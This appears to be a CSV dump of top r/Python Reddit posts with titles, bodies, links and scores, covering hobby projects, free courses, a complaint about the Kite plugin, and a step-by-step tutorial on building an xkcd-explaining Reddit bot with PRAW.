3l0o5p,Ask microsoft to include Python in Windows by default,,https://windows.uservoice.com/forums/265757-windows-feature-suggestions/suggestions/6693586-ship-python-3-and-python-2-with-windows-10,330,1247
ig81x0,15+ Free Python Projects for Beginners with full tutorial walkthroughs,,https://www.codewithrepl.it/python-projects-for-beginners.html,43,1247
ncbzhp,"Python programming: We want to make the language twice as fast, says its creator",,https://www.tectalk.co/python-programming-we-want-to-make-the-language-twice-as-fast-says-its-creator/,234,1243
y7q4gv,Call for questions for Guido van Rossum from Lex Fridman,"Hi, my name is Lex Fridman. I host a [podcast](https://www.youtube.com/c/lexfridman) and I've [previously interviewed Guido van Rossum](https://www.youtube.com/watch?v=ghwaIiE3Nd8) (4 years ago). I'm talking to him again soon and would like to hear if you have questions/topic suggestions, including technical and philosophical ones, on Python or programming in general.",https://www.reddit.com/r/Python/comments/y7q4gv/call_for_questions_for_guido_van_rossum_from_lex/,285,1242
c6uk99,Tired of checking craigslist for used cars so I made a python program to do it and send emails replies to good deals,,https://i.redd.it/j2qa3vq548731.png,140,1240
j7yl1g,"This is really amazing! If this person can make this sort of thing in his living room, I wonder what people with resources like at Google or CMU Navlab must be doing.I don't think I would need to renew my driving license.",,https://v.redd.it/qu7lwb44i2s51,86,1235
h8b1y6,Is This Headline Fake or Not? (isthisheadlinefake.com),,https://v.redd.it/yujz2i53jp451,58,1238
gtnyll,"Spotlightify (The Spotify overlay controller) Update - New Features added and Source Code Released! (Windows, macOS and Linux tested)",,https://v.redd.it/31qtwhcghz151,90,1242
t78212,My girlfriend remade the Python logo with punch-needle.,"[Image here](https://i.redd.it/u72tby6t0kl81.jpg)

I just wanted to share her creation. I think it looks very cute and I will for sure have it next to me in my office. It was actually quick to put together but the end result looks amazing.

Punch needle is a way to do embroidery on canvas with wool and a special needle. 

She is also a Python dev and she said that there is some overlap between the dev community and the knitting/embroidering/crochet community. Anybody else does the same?",https://www.reddit.com/r/Python/comments/t78212/my_girlfriend_remade_the_python_logo_with/,64,1235
kx94kc,best-of-python: A ranked list of awesome Python libraries and tools,"https://i.redd.it/n54xmlw9sbb61.gif

We've curated a list of the **best Python libraries and tools**!

The list is fully automated via GitHub Actions, so it will never get outdated. Every week it collects metadata from GitHub and package managers, calculates quality scores to rank projects inside categories, and identifies trending projects.

🔗 GitHub: [https://github.com/ml-tooling/best-of-python](https://github.com/ml-tooling/best-of-python)

🎉 We also released a few other best-of lists on Reddit today:

* [best-of-ml-python](https://github.com/ml-tooling/best-of-ml-python): Python libraries for machine learning.
* [best-of-python-dev](https://github.com/ml-tooling/best-of-python-dev): Python developer tools and libraries.
* [best-of-web-python](https://www.reddit.com/r/flask/comments/kx8mlu/bestofwebpython_a_ranked_list_of_awesome_python/): Python libraries for web development.
* [best-of-jupyter](https://www.reddit.com/r/IPython/comments/kx8v15/p_bestofjupyter_a_ranked_list_of_awesome_jupyter/): Jupyter Notebook, Hub, and Lab projects.

📫 For updates on trending projects, new additions and detailed comparisons, follow us on [Twitter](https://twitter.com/mltooling) or subscribe to our weekly [newsletter](https://mltooling.substack.com/subscribe).",https://www.reddit.com/r/Python/comments/kx94kc/bestofpython_a_ranked_list_of_awesome_python/,45,1231
gt5ups,Made a program that makes a photo mosaic out of any image.,,https://i.redd.it/2n80h7co5t151.gif,79,1233
iajyrr,Gitutor: A command line app that makes Git easy,,https://v.redd.it/gwpefbmzr9h51,98,1232
j38z5c,I made a face recognition program in Python by using the pre-trained model to compute face embedding. Next based on these face embedding I am able to classify between all the faces in my data. It works fine but is really slow when executed in real-time. I have a low-end i3 laptop without GPU.,,https://i.redd.it/3itploxqnhq51.jpg,130,1234
eaanag,Python + Quantum Research = Art + Saving 1000s hours of CPU time,,https://v.redd.it/464y0jpu3h441,30,1229
caac6i,I made a tool to download and set wallpapers from Reddit.,,https://i.redd.it/068yxg41gx831.gif,98,1235
uhzg3u,Andrew Ng's Machine Learning Course will be re-released in PYTHON this summer! (finally!),"Over the past 10 years 4.8 million people enrolled in the original Machine Learning Coursera course, but it wasn't in Python. 

[https://www.deeplearning.ai/program/machine-learning-specialization/](https://www.deeplearning.ai/program/machine-learning-specialization/)

&#x200B;

https://preview.redd.it/udhjjt849ex81.png?width=829&format=png&auto=webp&s=95774a979542960c764365468f34d20b8d57d026",https://www.reddit.com/r/Python/comments/uhzg3u/andrew_ngs_machine_learning_course_will_be/,89,1226
fo0eyj,"Codecademy is giving its pro subscription for free to help students, and they've got a great Python 3 course. Maybe you should enroll and utilize your time while in quarantine!",,https://www.aabhusanaryal.com.np/2020/03/free-codecademy-pro.html/,139,1223
91ol3u,Me doing my CS projects.,,https://i.redd.it/p8u7nhx3s0c11.png,218,1216
ongbqx,I did it!!,"TL;DR : I got placed (as Python Developer) for the first company that came to our campus and it's all because of Reddit!


All the posts I did and all the confusions I had were answered very nicely and it legit cleared all my doubts. Whether talking about DSA/DBMS/OOPS and even how to ace HR interviews, every single thing where I got stuck Reddit was the only answer to it. And I would like to appreciate how everyone here helps out each other from bottom of their heart.

Thank you so much guys!! <3
Love you all :')


Edit: OMG! My notification bar was flooded with lots of comments and PMs, and I can't express how much happy I am, thank you fcking very much y'all. This is the first time I am getting a SILVER award, thank youu kind people! Lovyaa.",https://www.reddit.com/r/Python/comments/ongbqx/i_did_it/,89,1218
ab97g3,Here are my Python projects from 2018! (Mostly Game Dev),,https://v.redd.it/3av0rby4fn721,131,1211
fwraav,"Interactive Chord Diagrams with the new ""chord"" Python package",,https://v.redd.it/t3b6uxvr9gr41,46,1208
5adirl,Thought you guys might appreciate this.,,https://i.reddituploads.com/8cff2ba2c07840b991600e4242756045?fit=max&h=1536&w=1536&s=7753045842506b3c4cb5b1c243a6bb59,23,1213
pn49pa,PSA: Kite is a viral plugin that kills your system performance,"I am doing a PSA:

Please be extra careful when you see Kite (the program auto-completor app). This app is atrociously bad for performance, it  spreads to all of your system (and I mean ALL of your system), and the developers intentionally made it hard for you to remove it. I made the mistake of installing it when I was trying out Spyder IDE. I didn't realize this app installed itself across all of my editors, including neovim. I started noticing that my neovim would get several seconds of hiccup when I was running  python REPL, which had never happened before. Soon my Linux system started experiencing severe hiccup as well. Then I did some profiling and found out that Kite was making background process calls without my consent. The  worst part yet is they made it nearly impossible for you uninstall it, not unless you download their shady app manager or make a curl call to a completely unknown api server just to uninstall apps on your computer. I don't even want to know what kind of personal information / data that they were stealing from my computer. I fail to see how Kite is different from a virus. Please use extra caution when going through IDE setup as something like Kite can easily creep in and contaminate your whole system just like that. To the developers of Spyder and VSCode and other IDEs, please take active step in banning an app like Kite that severely infringes upon the privacy and right of their users. By promoting this app as an extension, you are potentially endangering millions of your users!

EDIT on 9/13/2021:

I wanted to attach my comment response to juliusc (maintainer of Spyder) to the main post, as it echoes my core concerns. I want to thank juliusc for responding to this post.

**Hi juliusc,**

**First of all, I want to thank you for engaging this post and responding to my concerns. I took some time to collect my thoughts and just wanted to share them with you and other developers of popular development tools like Spyder, VSCode, Atom etc. By no means am I trying to single out Spyder, and I want you to know that I deeply appreciate all the work that you guys have done to empower everyone by democratizing better development tools.**

**I would like to point out though, that there was nothing ""light"" about the promotion of Kite in Spyder. As me and other users have noted, Kite installation during the initialization setup of Spyder was an opt-out by default. I am sure many people either clicked through the setup and installed Kite without reading the ""fine-prints"" as is totally reasonable for an average user, and/or they mistakenly assumed that Kite is a safe and secure plugin that had been vetted by the Spyder developers, as it's one of the first things that you see when you start using Spyder. Without sounding accusatory, I was very disappointed that the Spyder developers allowed this to happen. Since I haven't been monitoring your git tracker issues related to Kite (because frankly it's not my job), I will take your word for it that not many Spyder users raised my concern. But anyone who just googles Kite will quickly discover that Kite had severe security/privacy concerns, was an invasive software, and its company conducted extremely questionable business practices in other open source packages as far back as 2017. In fact, the very same announcement post of Kite's sponsorship of Spyder in 2019 already had several users that raised their concerns in the comments section (**[**https://www.spyder-ide.org/blog/spyder-kite-funding/**](https://www.spyder-ide.org/blog/spyder-kite-funding/)**). I don't think it's fair to say that well since the users didn't find any issue and complained about them on git, then we will let it slide. I get that you guys are maintaining/developing Spyder for all of us for free, but I also uphold you to a higher standard because a single bad commit or decision by you can lead to disproportional effects on the rest of us. And sometimes these effects take a while for us to find out and may have irreversible and disastrous consequences. I truly beseech you to be truthful with us and with yourselves, whether if corporate sponsorship, financial or otherwise, means that you can lower the standard that you hold for software integration, even if it comes at the cost of your users. Because if that is the case, then it's a slippery slope to the end of free and open source development as we know it.**

**Okay, enough of a long rant. Thank you for reading it.**

&#x200B;",https://www.reddit.com/r/Python/comments/pn49pa/psa_kite_is_a_viral_plugin_that_kills_your_system/,137,1214
8pa8ff,Face tracking anime girl with proximity detection,,https://v.redd.it/xna7lmmjwk211,132,1206
wdgcq8,I made a very pointless program that takes an image and converts it into a spreadsheet (1 pixel = 1 cell) but im very proud of it regardless. Source code in comments,"&#x200B;

https://reddit.com/link/wdgcq8/video/h9796dxaj3f91/player",https://www.reddit.com/r/Python/comments/wdgcq8/i_made_a_very_pointless_program_that_takes_an/,80,1208
mp49qo,I'm giving away my book on writing beautiful Python for free to celebrate its alpha release,"**TL;DR**

**update**: the book is now free forever!
Here's the link: [https://gumroad.com/l/pydonts](https://gumroad.com/l/pydonts).

When 2021 started, I started publishing a weekly series on my blog on how to write more Pythonic code. This “Pydont's” series is, and will always be, available for free on my blog for everyone to read: [https://mathspp.com/blog/pydonts](https://mathspp.com/blog/pydonts).

However, to make it more convenient for everyone to read all the articles and to create something more formal, I decided to also publish the collection of articles as a book.
You can get the book for free if you use this coupon code: [https://gumroad.com/l/pydonts/w99ucle](https://gumroad.com/l/pydonts/w99ucle).

The series of articles is still ongoing, as I release a new article every week. Therefore, the book will be updated as these new articles come out.
I am also considering adding a little something _only_ in the book, but I haven't decided what I will be doing, so feel free to drop your suggestions in the comments below!

I am really, really excited to share this with you, as sharing knowledge is one of my life's greatest passions! I hope you can download the book and learn something from it :) Be sure to let me know your feedback.

**Edit**: the feedback has been overwhelming and I am humbled by your support! Thank you so much :) I would love to get some testimonials to add to the book page, so if you have anything to say that I could use, please email me (contacts in the blog) or send me a DM over Reddit! Thank you so much!",https://www.reddit.com/r/Python/comments/mp49qo/im_giving_away_my_book_on_writing_beautiful/,122,1212
kmvanp,"Hey guys, it's me again, with my latest Python GUI for uninstalling the default Windows 10 apps, PyDebloatX.","It's been a few months since I introduced my personal project here. For those who don't know, this is a simple interface for uninstalling those default apps that come with Windows 10.  There are also EXE binaries in the GitHub Releases, for those who want to run it without Python.

I don't really like ""advertising"", so I thought a post at the end of the year should be fine. I hope you find it useful!

[GitHub link](https://github.com/Teraskull/PyDebloatX/?v=n)

Happy holidays!

https://preview.redd.it/kt9kodjv59861.png?width=533&format=png&auto=webp&s=5cc843dec7a7bae70af75c4541048e25b1e4efe1",https://www.reddit.com/r/Python/comments/kmvanp/hey_guys_its_me_again_with_my_latest_python_gui/,135,1202
g5xoad,Anyone Want Snek in Animal Crossing?,,https://i.redd.it/mcor01bi2cu41.png,22,1205
a27d7u,render 3d cube wireframe in console,,https://v.redd.it/blt0xt4uoq121,40,1194
xcr4tt,"I'm Al Sweigart, author of Automate the Boring Stuff with Python. I'm currently doing an AMA about my latest book on recursive algorithms.","Please post question to the AMA thread rather than on this post. Thank you!

https://www.reddit.com/r/IAmA/comments/xcp6jv/im_al_sweigart_author_of_several_free_programming/

EDIT: Heyas, I'm done for the day. Thanks to everyone who asked questions!",https://www.reddit.com/r/Python/comments/xcr4tt/im_al_sweigart_author_of_automate_the_boring/,53,1192
ff7rhi,"(PyAutoGui, AHK, Python) Twitch Plays League of Legends",,https://gfycat.com/bountifulconfusedgemsbuck,38,1195
jpojgg,73 Examples to Help You Master Python's f-strings,,https://miguendes.me/73-examples-to-help-you-master-pythons-f-strings,53,1191
inllmf,Ultimate Python study guide,"[https://github.com/huangsam/ultimate-python](https://github.com/huangsam/ultimate-python)

Ultimate Python study guide for newcomers and professionals alike. 🐍 🐍 🐍

    print(""Ultimate Python study guide"")

I created a GitHub repo to share what I've learned about [core Python](https://www.python.org/) over the past 5+ years of using it as a college graduate, an employee at large-scale companies and an open-source contributor of repositories like [Celery](https://github.com/celery/celery) and [Full Stack Python](https://github.com/mattmakai/fullstackpython.com). I look forward to seeing more people learn Python and pursue their passions through it. 🎓

Here are the primary goals of creating this guide:

🏆 **Serve as a resource** for Python newcomers who prefer to learn hands-on. This repository has a collection of standalone modules which can be run in an IDE like [PyCharm](https://www.jetbrains.com/pycharm/) and in the browser like [Repl.it](https://repl.it/languages/python3). Even a plain old terminal will work with the examples. Most lines have carefully crafted comments which guide a reader through what the programs are doing step-by-step. Users are encouraged to modify source code anywhere as long as the mainroutines are not deleted and [run successfully](https://github.com/huangsam/ultimate-python/blob/master/runner.py) after each change.

🏆 **Serve as a pure guide** for those who want to revisit core Python concepts. Only [builtin libraries](https://docs.python.org/3/library/) are leveraged so that these concepts can be conveyed without the overhead of domain-specific concepts. As such, popular open-source libraries and frameworks are not installed. However, reading the source code in these frameworks is inspiring and highly encouraged if your goal is to become a true [Pythonista](https://www.urbandictionary.com/define.php?term=pythonista).",https://www.reddit.com/r/Python/comments/inllmf/ultimate_python_study_guide/,48,1194
fygn3n,I made a script that organizes a folder!,,https://v.redd.it/m6pl0jvs10s41,118,1186
nzlqr6,"Second year calculus done entirely in PYTHON: No pencil or paper is required! Included are things that are traditionally a pain to deal with, such as path and surface integrals. See comments for more info",,https://youtu.be/Teb28OFMVFc,52,1187
g939sg,Chess game python,,https://v.redd.it/ahl0guwptdv41,62,1184
d7tcmk,I made a command line program that plays random animal videos to cheer you up.,,https://i.redd.it/i2eji17ah6o31.gif,72,1184
n6ecne,A post of appreciation of development of Python,"As you may heard, there are released notes on what's new in Python 3.10.

Among a lot of new additions I would say that one of the greatest updates that came is improvement of error messages. Not only are they now much better at locating the error, they are now even more descriptive. And what's cooler is that they are now also suggestive. 

Example:

if x = 2

Earlier: SyntaxError: invalid syntax

Now: SyntaxError: cannot assign to attribute here. Maybe you meant ""=="" instead of ""=""?


And it would even try to see if there is a similarly named variables, if you typed in wrong name. 

Example (from notes):

\>\>\> schwarzschild_black_hole = None

\>\>\> schwarschild_black_hole

... NameError: name 'schwarschild_black_hole' is not defined. Did you mean: schwarzschild_black_hole?


Huge appreciation to Pablo Galindo who contributed to all these error message improvements!

Source: https://docs.python.org/3.10/whatsnew/3.10.html",https://www.reddit.com/r/Python/comments/n6ecne/a_post_of_appreciation_of_development_of_python/,99,1181
f4dohl,Hot reloading for realtime UI editing,,https://i.redd.it/oiblk90su4h41.gif,29,1179
bp0pq0,The BEST update for my 3D renderer! I added Gouraud shading and the result is really satisfying. All of these have been rendered with it:,,https://i.redd.it/mmckbwhfsey21.png,97,1187
j3rg8c,"My last post about Face recognition got amazing response from all of you guys on Python subreddit, I added few faces to the model and now it can recognise my mother too that too in low light, its amazing.I ll post link to script in the comment below.",,https://i.redd.it/41sv9naognq51.jpg,91,1187
guq34c,A very basic `ls` clone with hyperlinked filenames,,https://v.redd.it/t4vmxmwjec251,54,1184
hswvwc,"I made an Ai discord bot for Coronavirus [Predictions , Statistics and over 100 visuals & features]",,https://v.redd.it/nktq0f7s0fb51,54,1182
wh1p73,Big respect to 90’s programmers and before. I can’t imagine how horrible today’s programmers would be without the Internet?,I can’T imagine creating a full program without the help of Google. Just wanted to pay homage to those that came before me. They must have been so disciplined and smart.,https://www.reddit.com/r/Python/comments/wh1p73/big_respect_to_90s_programmers_and_before_i_cant/,262,1180
jdyt3z,"My First Book: 200 Python Exercises, An Introduction to Python",,https://leanpub.com/learnpythonbyexercises,57,1174
m515yk,Gamestonk Terminal: The equivalent to an open-source python Bloomberg Terminal.,"[https://github.com/DidierRLopes/GamestonkTerminal](https://github.com/DidierRLopes/GamestonkTerminal)

If you like stocks and are careful with the way you spend your money, (me saying it seems counter-intuitive given that I bought GME at the peak, I know) you know how much time goes into buying shares of a stock.

You need to: Find stocks that are somehow undervalued; Research on the company, and its competitors; Check that the financials are healthy; Look into different technical indicators; Investigate SEC fillings and Insider activity; Look up for next earnings date and analysts estimates; Estimate market’s sentiment through Reddit, Twitter, Stocktwits; Read news;. … the list goes on.

It’s tedious and I don’t have 24k for a Bloomberg terminal. Which led me to the idea during xmas break to spend the time creating my own terminal. I introduce you to “Gamestonk Terminal” (probably should’ve sent 1 tweet everyday to Elon Musk for copyrights permission eheh).

As someone mentioned, this is meant to be like a swiss army knife for finance. It contains the following functionalities:

* **Discover Stocks:** Some features are: Top gainers; Sectors performance; upcoming earnings releases; top high shorted interest stocks; top stocks with low float; top orders on fidelity; and some SPAC websites with news/calendars.
* **Market Sentiment:** Main features are: Scrolling through Reddit main posts, and most tickers mentions; Extracting trending symbols on stocktwits, or even stocktwit sentiment based on bull/bear flags; Twitter in-depth sentiment prediction using AI; Google mentions over time.
* **Research Web pages:** List of good pages to do research on a stock, e.g. macroaxis, zacks, macrotrends, ..
* **Fundamental Analysis:** Read financials from a company from Market Watch, Yahoo Finance, Alpha Vantage, and Financial Modeling Prep API. Since I only rely on free data, I added the information from all of these, so that the user can get it from the source it trusts the most. Also exports management team behind stock, along with their pages on Google, to speed up research process.
* **Technical Analysis:** The usual technical indicators: sma, rsi, macd, adx, bbands, and more.
* **Due Diligence:** It has several features that I found to be really useful. Some of them are: Latest news of the company; Analyst prices and ratings; Price target from several analysts plot over time vs stock price; Insider activity, and these timestamps marked on the stock price historical data; Latest SEC fillings; Short interest over time; A check for financial warnings based on Sean Seah book.
* **Prediction Techniques:** The one I had more fun with. It tries to predict the stock price, from simple models like sma and arima to complex neural network models, like LSTM. The additional capability here is that all of these are easy to configure. Either through command line arguments, or even in form of a configuration file to define your NN.
* **Reports**: Allows you to run several jobs functionalities and write daily notes on a stock, so that you can assess what you thought about the stock in the past, to perform better decisions.
* **Comparison Analysis**: Allows you to compare stocks.
* **On the ROADMAP**: Cryptocurrencies, Portfolio Analysis, Credit Analysis. Feel free to add the features you'd like and we would happily work on it.

NOTE: This project will always remain open-source, and the idea is that it can grow substantially over-time so that more and more people start taking advantage of it.

I hope you find this useful, and even contribute to the project! The installation guidelines are in a much better state now, so it should be much easier to install and play with it.

Thanks!

https://preview.redd.it/iemlf1kah1n61.png?width=464&format=png&auto=webp&s=33e25d9397c9e5a1c3d90ff786f17dab6f521753",https://www.reddit.com/r/Python/comments/m515yk/gamestonk_terminal_the_equivalent_to_an/,148,1179
jl5uxv,Free Python Programming Course on Udemy!," Learn Python, JavaScript, ethical hacking and more with these 7 FREE courses! Enroll now, 3 days only!

1. https://www.udemy.com/course/python-complete/?couponCode=NOVFREE
2. https://www.udemy.com/course/front-end-web-development/?couponCode=NOVFREE
3. https://www.udemy.com/course/full-stack-javascript/?couponCode=NOVFREE
4. https://www.udemy.com/course/linux-system-admin/?couponCode=NOVFREE
5. https://www.udemy.com/course/google-chrome-extension/?couponCode=NOVFREE
6. https://www.udemy.com/course/python3-for-beginners/?couponCode=NOVFREE
7. https://www.udemy.com/course/ethical-hacking-professional/?couponCode=NOVFREE",https://www.reddit.com/r/Python/comments/jl5uxv/free_python_programming_course_on_udemy/,123,1174
nd76nk,"Using a combination of lambda functions, list comprehension, and ternary operators, (and Pygame), I was able to make Flappy Bird in one line of Python!","I also hardcoded the raw bytes of all of the images so that the program can run completely independent of any other file, in one line.

[https:\/\/github.com\/Fencerr\/Flappy-Bird-written-entirely-in-one-line-of-python](https://reddit.com/link/nd76nk/video/dje7ta8pacz61/player)",https://www.reddit.com/r/Python/comments/nd76nk/using_a_combination_of_lambda_functions_list/,72,1176
78uvdw,"I wrote a Reddit bot in Python a few weeks back, and asked people if they were interested in learning the process, tools and practices. I'm posting it on r/Python, and hope you find it helpful.","Hello all

I asked you people if you are interested in learning Python by writing a Reddit bot some time back on r/learnprogramming. I received immense number of responses, so I'm posting it on r/python. It covers the process, practices and tools involved in writing a Reddit bot in Python.

Please post your feedback and questions in comments, and I'll be happy to answer them.

#**Requirements**:

1. You are somewhat familiar with programming in general, and have an idea about Python or other languages (like what are variables etc)
2. You  are on a Unix-like system with access to command line tools
3. Familiarity with [git](https://git-scm.com/) and [Github](https://github.com/) (Not really required...it is better if you are familiar)
4. A Reddit account

Even if you don't meet these requirements...no need to worry!

#**Introduction**

Writing a bot for Reddit is easier than you think, because Reddit provides a structured method to access its data via the [Reddit API](https://www.reddit.com/dev/api). There are amazing tools like [PRAW](https://praw.readthedocs.io/en/latest/) which can help simplify the process. PRAW is a Python wrapper for Reddit, and it takes the pain out of the process of writing a bot.


And as I said earlier, Python is an great language, which is easy to grasp for beginners. What even more amazing is it's community, which has made incredible open-source tools and libraries for almost anything. We will be using some of those, and you will realise how useful they are!

#**Important information - Please read**

1. While this post will cover a variety of programming topics, I highly encourage you to explore more. Go ahead and read the documentation of libraries used and think about how can you improve something in your project. I will possibly add more topics to this post.

2. Please **DO NOT CREATE SPAM** by letting your bot run on all of Reddit before you have thoroughly tested it. **r/test** exists for you to do all sorts of testing with your bot...please use it. Refer to [botiquette](https://www.reddit.com/wiki/bottiquette) and keeping in mind the type of bot you create, comply with the guidelines.

#**The code and resources**

I jus wrote a bot for Reddit, which posts a textual explanation of the popular webcomic [xkcd](https://www.xkcd.com) whenever it encounters an xkcd link. It is named **explainxkcdbot**. As of now, I have set my bot to run on r/test only to let you people test it all you want.


You can find the complete source code on my Github page - 
**https://github.com/aydwi/explainxkcdbot**

Here is the code for the bot -
**https://github.com/aydwi/explainxkcdbot/blob/master/explainxkcdbot.py**


#**How to run the bot**

The process is given here - https://github.com/aydwi/explainxkcdbot/blob/master/README.md

If you have any problems in running the bot, please let me know in the comments.


#**Let us begin**

We will move forward step-by-step in the code, and see what is going on.

##Section 1 - Importing libraries


https://gist.github.com/aydwi/e5e4f294b66adf1cb025a70a0392f847


This is the beginning of the program. Any line which begins with a `#` sign is a comment in Python, so it is not interpreted as code. Then we import the essential libraries required for out program. These libraries contain the methods (or functions) which we will use throughout our program. The syntax is pretty straightforward. Next we see 3 variables with some values assigned to them. More on them later.


##Section 2 - Authenticating


https://gist.github.com/aydwi/b941d04d8128e415d6630e961cc97988


This is where important things begin. Before proceeding, you should have a basic idea of what are **[classes](https://docs.python.org/3/tutorial/classes.html)** and **[methods](https://stackoverflow.com/questions/3786881/what-is-a-method-in-python)** in Python. One more important thing is an **object** - it is an instance of class, which holds the data variables declared in class and the **member functions work on these objects**. Please make a comment if you do not understand, I will try to explain.


`def authenticate():` defines a function which will try to authenticate the bot to Reddit. This is where PRAW comes into play as it provides us methods to do this. Remember we created a *praw.ini* file earlier. It is a configuration file that stores authentication credentials, so that you just call it whenever needed.


Next, we pass authentication parameters to `praw.Reddit()`. Here `explainbot` refers to the credentials in the configuration file, and `user_agent` is a descriptive string about your script/bot. This returns a [Reddit instance](https://praw.readthedocs.io/en/latest/code_overview/reddit_instance.html), which we assign to the variable `reddit`, and use this variable whenever we wish to authenticate.


Next up, we make a print statement to see who is getting authenticated i.e. the name. The `user` class in PRAW provides methods for the currently authenticated user. We call the method `me()` on `user` and then call it on the variable holding the Reddit instance for authentication, which in our case is `reddit`. So the statement becomes `reddit.user.me()`. We just use some [formatting in python](https://pyformat.info/) to print it.


Finally we `return` the variable `reddit`. Now i can use this `authenticate()` function in my program by calling it when I need it, and it will give me the variable `reddit`, which stores the Reddit instance.

------------------------------

**Important note 1:** Why did I create a function? It is because creating functions makes us easy to manage out code. We write separate functions for separate features of the program, and call them wherever needed. This breaks the code into manageable chunks, which makes it easy to read, modify and debug.

------------------------------

##Section 3 - Scraping


https://gist.github.com/aydwi/699123424e7b38da19d62e69339e859c


Next up is the function `def fetchdata(url)`. Notice how this function takes a parameter `url`. We pass this parameter whenever we call this function. The purpose of this function is to scrape/gather the data from the web, in order to post an explanation.


**Now scraping is not a very reliable process**, but sometimes we just have to do it. We go to a website, go through it's HTML source, and extract the text, links etc. that we want. Here we use **[Requests](http://docs.python-requests.org/en/master/user/quickstart/#make-a-request)** library to make a web request, and **[Beautiful Soup](https://www.crummy.com/software/BeautifulSoup/bs4/doc/)** to extract the data.


`r = requests.get(url)` gives a Response object called `r`. We can get all the information we need from this object. Then we call the method `content` on `r`, and pass it to `soup = BeautifulSoup(r.content, 'html.parser')`, which gives us a `soup` object with which we can retrieve elements of a web page. Read more [here](https://www.crummy.com/software/BeautifulSoup/bs4/doc/).


Now what happens depends on what are you scraping. Every website has different type of content, and you should go through the HTML to see how can you retrieve what you want. In my case http://explainxkcd.com has it's explanation inside the first few `<p>` tags, so I look for the first `<p>` tag by `tag = soup.find('p')`. Also, immediately after the explanation ends, `<h2>` tag follows, so I know where to stop. Now take a look here-

    while True:
        if isinstance(tag, bs4.element.Tag):
            if tag.name == 'h2':
                break
            if tag.name == 'h3':
                tag = tag.nextSibling
            else:
                data = data + '\n' + tag.text
                tag = tag.nextSibling
        else:
            tag = tag.nextSibling

I continue to look through the tags, and store textual data in a `string` named `data` and move to the next tag. I `break` the process if I encounter `<h2>` because I know that is where explanation ends. The code depends on the structure of website you are scraping. Finally, I return `data`, so that now when I call the function like `fetchdata('http://explainxkcd.com/1024')` for example, it returns me the explanation of comic 1024 as a `string` named `data`.

----------------

**Important note 2:** Scraping is unreliable. If the website changes it's structure, you have to change your code. In this case, it can still include some tags which we don't want. The line `if (tag.name == 'h3')` in the above function is for handling one such unexpected situation I encountered on http://explainxkcd.com. This is why we like to have APIs. 

--------------------------


##Section 4 - Using regular expressions, parsing URLs, handling exceptions and preventing duplicate submissions


https://gist.github.com/aydwi/700db3e46770d13fe89356d0fa4f570d


This function which takes a parameter which is a Reddit instance (remember that Reddit instance from Section 1). Again we use PRAW to get one or more subreddits, and go through their comments. See [here](https://praw.readthedocs.io/en/latest/code_overview/reddit/subreddits.html) and [here](http://praw.readthedocs.io/en/latest/code_overview/models/comment.html).

You can pass multiple subreddits like `for comment in reddit.subreddit('test+learnprogramming+pics')`.

**Regular Expressions**: Now I want to extract xkcd links from the comments, so I need to look for a pattern for the URL. xkcd links are of the form `https://www.xkcd.com/[some number]`. So we make use of regular expressions from the `re` library to match the pattern. [More about regular expressions](https://regexone.com/references/python).

    match = re.findall(""https://www.xkcd.com/[0-9]+"", comment.body)
        if match:
            print(""Link found in comment with comment ID: "" + comment.id)
            xkcd_url = match[0]

Here I look for all strings that are like `https://www.xkcd.com/[some number]` using the method `findall` from [user comments](http://praw.readthedocs.io/en/latest/code_overview/models/comment.html), and if it matches, it returns a list with the matching URL, and we store our URL in the variable `xkcd_url`.

----------------

**Important note 3:** Try to find out regular expressions (regex) to improve this program. What happens if a user posts 'https://xkcd.com/1024' or http version as 'http://www.xkcd.com/1024'. These are still valid xkcd URLs. There can be some other cases where the URL might be placed between a bunch of symbols in a comment. Try to modify the regex statement so that it can detect these cases as well.

--------------------------


**URL parsing**: Now I have an xkcd URL. I have 2 immediate objectives now- 

Objective 1. To extract the comic number at the end of the URL. We use [urllib.parse](https://docs.python.org/3/library/urllib.parse.html) for this purpose.

    url_obj = urlparse(xkcd_url)
            xkcd_id = int((url_obj.path.strip(""/"")))

Objective 2. Form a complete **explainxkcd.com** URL, which I will pass as a parameter to the function `fetchdata(url)` (See Section 2)

    myurl = 'http://www.explainxkcd.com/wiki/index.php/' + str(xkcd_id)

Both objectives are thus complete.

**Preventing duplicate submissions and Exception handling**: The bot needs to make sure it replies to every comment only once. There are many methods you can try which include using a separate key-value database like [Memcached](https://memcached.org/), but we will use a simpler approach.


Just create a text file (remember commented.txt), store the comment ID of a comment in it when you  visit a relevant comment, and verify if a comment ID already exists in that file before making new comments. Remember to put the location of the text file in the `path` variable (from Section 1), so that you can pass it to the method `open()`.


Now, what happens when a user makes a comment like 'https://www.xkcd.com/689243348723'. This xkcd does not exist, but the program will extract '689243348723', then form a link like http://www.explainxkcd.com/wiki/index.php/689243348723, and pass it to the function `fetchdata(url)`. Now **the function will return an exception and your program will stop/crash**. You need to take care of these situations.

This is achieved using `try`, `except` and `else` blocks. [See here](https://docs.python.org/3/tutorial/errors.html) Here is the code for these 2 steps-

    file_obj_r = open(path,'r')
                        
            try:
                explanation = fetchdata(myurl)
            except:
                print('Exception!!! Possibly incorrect xkcd URL...\n')
                # Typical cause for this will be a URL for an xkcd that does not exist (Example: https://www.xkcd.com/772524318/)
            else:
                if comment.id not in file_obj_r.read().splitlines():
                    print('Link is unique...posting explanation\n')
                    comment.reply(header + explanation + footer)
                    
                    file_obj_r.close()

                    file_obj_w = open(path,'a+')
                    file_obj_w.write(comment.id + '\n')
                    file_obj_w.close()
                else:
                    print('Already visited link...No reply needed\n')


Notice how I make a reply to a relevant comment by using the variables from Section 1 to print header and footer description alongside the explanation - `comment.reply(header + explanation + footer)`


Next we make some `sleep` statements to stop the bot from querying Reddit too fast. If the Reddit API returns an error due to too many requests, adjust `val` in the instances of `time.sleep(val)` in your program.


##Section 5: The main function


https://gist.github.com/aydwi/99323ebd710428f4590077a844236f83


We are almost done here. We wrap our functions into a `main` function by calling `authenticate()` (remember Section 1) and passing it to the function which runs the bot, namely `run_explainbot(reddit)`. Since we are calling it inside `while` loop with the expression 'True', it will run indefinitely.


#My bot in action


Test post to show the bot in action: https://redd.it/6tey71 (Since I'm not running it continuously as of now, it won't reply to every comment containing an xkcd link there)

My Terminal emulator while running the bot: http://imgur.com/4TzEyor


**Finally, if you want to take this project further, you are welcome to contribute code to [my Github repository](https://github.com/aydwi/explainxkcdbot). You can fork it (please note that there are still some checks to be added in order to make the bot more Reddit friendly) or open a pull request.** I'll try to add more details about file handling and scraping aspects of the program once I get some time. 
",https://www.reddit.com/r/Python/comments/78uvdw/i_wrote_a_reddit_bot_in_python_a_few_weeks_back/,53,1165
